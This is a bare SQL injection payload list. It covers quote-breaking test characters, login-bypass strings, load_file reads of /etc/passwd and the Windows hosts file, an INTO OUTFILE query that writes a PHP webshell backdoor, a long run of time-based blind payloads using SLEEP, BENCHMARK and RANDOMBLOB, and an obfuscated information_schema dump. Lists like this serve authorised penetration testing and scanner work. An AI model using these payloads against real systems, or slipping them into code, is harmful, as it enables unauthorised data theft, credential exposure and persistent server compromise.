# Test:
'
"
`
')
'))
")
"))


# Basic SQLi
login' or 1012=1024;#
login' or id=1;#
login' or 1012=1024 limit 1;#

# Load file:
union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
union all select 1, 2, load_file('/etc/passwd')

# Create file (webshell, backdoor):
union all select 1, 2, "<?php echo shell_exec($_GET['do']);?>" into OUTFILE 'file/path/backdoor.php'

# Blind stuff:
1 and sleep 5--
1 and sleep 5
1 and sleep(5)--
1 and sleep(5)
' and sleep 5--
' and sleep 5
' and sleep 5 and '1'='1
' and sleep(5) and '1'='1
' and sleep(5)--
' and sleep(5)
' AnD SLEEP(5) ANd '1
and sleep 5--
and sleep 5
and sleep(5)--
and sleep(5)
and SELECT SLEEP(5); #
AnD SLEEP(5)
AnD SLEEP(5)--
AnD SLEEP(5)#
 and sleep 5--
 and sleep 5
 and sleep(5)--
 and sleep(5)
 and SELECT SLEEP(5); #
' AND SLEEP(5)#
" AND SLEEP(5)#
') AND SLEEP(5)#
or sleep 5--
or sleep 5
or sleep(5)--
or sleep(5)
or SELECT SLEEP(5); #
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
 or sleep 5--
 or sleep 5
 or sleep(5)--
 or sleep(5)
 or SELECT SLEEP(5); #
' OR SLEEP(5)#
" OR SLEEP(5)#
') OR SLEEP(5)#
sleep(5)#
(sleep 5)--
(sleep 5)
(sleep(5))--
(sleep(5))
-sleep(5)
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
";sleep 5--
";sleep 5
";sleep(5)--
";sleep(5)
";SELECT SLEEP(5); #
1 SELECT SLEEP(5); #
+ SLEEP(5) + '
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
;sleep 5--
;sleep 5
;sleep(5)--
;sleep(5)
;SELECT SLEEP(5); #
'&&SLEEP(5)&&'1
' SELECT SLEEP(5); #
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)--
ORDER BY SLEEP(5)#
AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
OR (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
RANDOMBLOB(500000000/2)
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
RANDOMBLOB(1000000000/2)
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))


export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)
